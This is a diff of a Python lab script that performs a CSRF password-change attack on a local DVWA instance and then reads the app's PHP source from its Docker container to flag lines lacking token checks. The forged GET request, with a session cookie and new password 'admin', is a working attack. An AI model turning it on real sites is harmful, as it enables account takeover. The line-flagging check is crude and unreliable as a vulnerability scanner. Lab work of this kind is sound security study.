@@ -1,26 +1,24 @@
 import requests
+from bs4 import BeautifulSoup
 import subprocess
 
-# Adjust the URL to point to the CSRF endpoint in DVWA
-vulnerable_url = ''  # Replace with actual URL
-
-# Replace with your actual session cookies from DVWA
+# Base URL for DVWA CSRF vulnerability
+base_url = 'http://127.0.0.1/vulnerabilities/csrf/'
 cookies = {
-    'PHPSESSID': "",  
-    'security': 'low'  # Ensure the security level matches the one set in DVWA
+    'PHPSESSID': 'e4lpasml78avcva4t7uj8h79d4',  # Replace with your actual session cookie
+    'security': 'low'  # Adjust based on the security level
 }
 
-# Data payload for the CSRF attack - changing password without old password
+# CSRF payload
 csrf_payload = {
-    'password_new': 'password',  # New password
-    'password_conf': 'password',  # Confirm new password
-    'Change': 'Change'  # Adjust as per your form submit button or field name
+    'password_new': 'admin',  # New password to set
+    'password_conf': 'admin', # Confirm new password
+    'Change': 'Change'
 }
 
-def fetch_php_code(file_path):
-    """Fetch and return the PHP code from the Docker container."""
+def get_container_id():
+    """Retrieve the container ID for the running DVWA container."""
     try:
-        # Get the container ID
         result = subprocess.run(
             ["docker", "ps", "--filter", "ancestor=vulnerables/web-dvwa", "--format", "{{.ID}}"],
             capture_output=True,
@@ -29,19 +27,26 @@ def fetch_php_code(file_path):
         container_id = result.stdout.strip()
         if not container_id:
             raise ValueError("No DVWA container found.")
-        
-        # Fetch the PHP code from the specified file path
+        return container_id
+    except Exception as e:
+        print(f"Error retrieving container ID: {e}")
+        return None
+
+def fetch_php_code(file_path):
+    """Fetch and return the PHP code from the Docker container."""
+    try:
+        container_id = get_container_id()
+        if not container_id:
+            print("Unable to retrieve container ID.")
+            return ""
+
+        print(f"Fetching PHP code from: {file_path}")
         result = subprocess.run(
             ["docker", "exec", container_id, "cat", file_path],
             capture_output=True,
             text=True
         )
-        php_code = result.stdout
-        if php_code:
-            return php_code
-        else:
-            print(f"No PHP code found at {file_path}.")
-            return ""
+        return result.stdout
     except Exception as e:
         print(f"Error fetching PHP code: {e}")
         return ""
@@ -52,71 +57,116 @@ def extract_vulnerable_lines(php_code):
     vulnerable_lines = []
 
     for i, line in enumerate(lines):
-        # Check for common signs of CSRF vulnerability
-        if 'isset($_GET' in line:
-            vulnerable_lines.append(f"Line {i + 1}: {line.strip()}")
-        elif '$pass_new' in line and '$pass_conf' in line:
-            vulnerable_lines.append(f"Line {i + 1}: {line.strip()}")
-        elif 'mysqli_query' in line:
-            vulnerable_lines.append(f"Line {i + 1}: {line.strip()}")
+        # Check for POST or GET parameters
+        if 'isset($_POST' in line or 'isset($_GET' in line:
+            # Check if there is no CSRF token check
+            if 'checkToken' not in php_code:
+                vulnerable_lines.append(f"Line {i + 1}: {line.strip()} - Potential CSRF vulnerability detected. Reason: Missing CSRF token validation.")
+        elif '$_POST' in line or '$_GET' in line:
+            # Check if there is no CSRF token check
+            if 'checkToken' not in php_code:
+                vulnerable_lines.append(f"Line {i + 1}: {line.strip()} - Potential CSRF vulnerability detected. Reason: Missing CSRF token validation.")
 
     return vulnerable_lines
 
-def validate_cookies():
-    """Validate if cookies are correct by accessing a protected page."""
+def list_php_files(directory):
+    """List all PHP files in a given directory inside the Docker container."""
     try:
-        # Access a page that requires authentication
-        response = requests.get(vulnerable_url, cookies=cookies, timeout=10)
-        if 'Login' in response.text or response.status_code == 403:
-            print("Error: Cookies are incorrect or session has expired. Please check your session cookies.")
-            return False
-        return True
-    except requests.exceptions.RequestException as e:
-        print(f"Error while validating cookies: {e}")
-        return False
+        container_id = get_container_id()
+        if not container_id:
+            print("Unable to retrieve container ID.")
+            return []
+
+        print(f"Listing PHP files in directory: {directory}")
+        result = subprocess.run(
+            ["docker", "exec", container_id, "find", directory, "-type", "f", "-name", "*.php"],
+            capture_output=True,
+            text=True
+        )
+        files = result.stdout.strip().split('\n')
+        return files
+    except Exception as e:
+        print(f"Error listing PHP files: {e}")
+        return []
+
+def extract_main_content(response_text):
+    """Extract and return more detailed content related to password change."""
+    soup = BeautifulSoup(response_text, 'html.parser')
+
+    # Extracting all text from the response to find key sections
+    full_text = soup.get_text(separator='\n', strip=True)
+    
+    # Locate the section where 'Password Changed.' appears
+    success_message = 'Password Changed.'
+    start_index = full_text.find(success_message)
+    
+    if start_index != -1:
+        # Extract content around the success message
+        start_index = max(start_index - 100, 0)  # 100 characters before the message
+        end_index = min(start_index + len(success_message) + 200, len(full_text))  # 200 characters after the message
+        return full_text[start_index:end_index]
+    
+    return "Password change confirmation not found."
 
 def csrf_attack():
-    """Perform CSRF attack and display vulnerable code."""
+    """Perform CSRF attack and display vulnerability results."""
     print("Performing Cross-Site Request Forgery (CSRF) Attack to Change Password...\n")
     
-    # Validate cookies before performing the attack
-    if not validate_cookies():
-        return
-
+    security_level = cookies.get('security')
+    print(f"Security Level: {security_level}")
+    
+    # Display the payload used for the attack
+    print("CSRF Payload Used:")
+    for key, value in csrf_payload.items():
+        print(f"{key}: {value}")
+    
     try:
-        # Prepare GET parameters
-        params = {
-            'password_new': csrf_payload['password_new'],
-            'password_conf': csrf_payload['password_conf'],
-            'Change': csrf_payload['Change']
-        }
-        
-        response = requests.get(vulnerable_url, cookies=cookies, params=params, timeout=10)
+        response = requests.get(base_url, cookies=cookies, params=csrf_payload, timeout=10)
+        # Use BeautifulSoup to parse the response content
+        soup = BeautifulSoup(response.text, 'html.parser')
 
-        # Check response content or status code for successful operation
-        if 'Password changed.' in response.text or response.status_code == 200:
+        # Extract the main content from the response
+        main_content = extract_main_content(response.text)
+
+        # Check if 'Password Changed.' is in the main content using BeautifulSoup
+        success_message = soup.find(string="Password Changed.")
+        if success_message:
             print("CSRF Attack successful!")
-            print("CSRF Payload Sent:", params)
+            print("CSRF Payload URL:", base_url)
         else:
-            print("CSRF Attack unsuccessful.")
-            print("Response:", response.text)
+            print("CSRF Attack unsuccessful. Password not changed.")
         
-        # Display vulnerable PHP code
-        print("\n--- Vulnerable PHP Code Snippets ---")
-        php_code = fetch_php_code('/var/www/html/vulnerabilities/csrf/source/low.php')
-        vulnerable_lines = extract_vulnerable_lines(php_code)
-        
-        if vulnerable_lines:
-            for line in vulnerable_lines:
-                print(line)
-            print("Reason: The application is vulnerable to CSRF because user inputs are not protected by anti-CSRF tokens or validation checks.")
-        else:
-            print("No vulnerable lines found.")
-        
-        print("--- End of Vulnerable PHP Code Snippets ---")
+        # Display main content for debugging
+        print("\n--- Main Content of the Response ---\n")
+        print(main_content)
+        print("\n--- End of Main Content ---\n")
+
+        # List and process all PHP files in the source directory
+        php_files = list_php_files('/var/www/html/vulnerabilities/csrf/source/')
+        if not php_files:
+            print("No PHP files found.")
+            return
+
+        print("Checking the following PHP files for vulnerabilities:")
+        for php_file in php_files:
+            print(f"Processing file: {php_file}")
+            php_code = fetch_php_code(php_file)
+            if php_code:
+                vulnerable_lines = extract_vulnerable_lines(php_code)
+                if vulnerable_lines:
+                    print(f"\nVulnerable File: {php_file}")
+                    print("--- Vulnerable PHP Code Snippets ---\n")
+                    for line in vulnerable_lines:
+                        print(line)
+                    print("\n--- End of Vulnerable PHP Code Snippets ---\n")
+                else:
+                    print(f"No specific vulnerable code snippets found in {php_file}.")
+            else:
+                print(f"Error: Unable to fetch PHP code from {php_file}.")
 
     except requests.exceptions.RequestException as e:
         print(f"Error: {e}")
 
 # Run CSRF attack
 csrf_attack()
+
